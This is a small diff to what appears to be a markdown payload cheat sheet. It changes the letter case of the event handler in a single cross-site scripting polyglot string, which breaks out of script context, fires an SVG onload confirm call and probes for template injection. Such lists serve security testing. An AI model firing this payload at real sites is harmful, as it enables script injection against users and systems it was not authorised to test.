@@ -1,6 +1,6 @@
 ### XSS ployglot
 ```
-\u0022\u003c%26quot;%26gt;%26lt;"';}};"></ScRipt><svg/onload=confirm(69)>${{7*7}}
+\u0022\u003c%26quot;%26gt;%26lt;"';}};"></ScRipt><svg/oNLoad=confirm(69)>${{7*7}}
 ```
 
 #### XSS in SVG image 
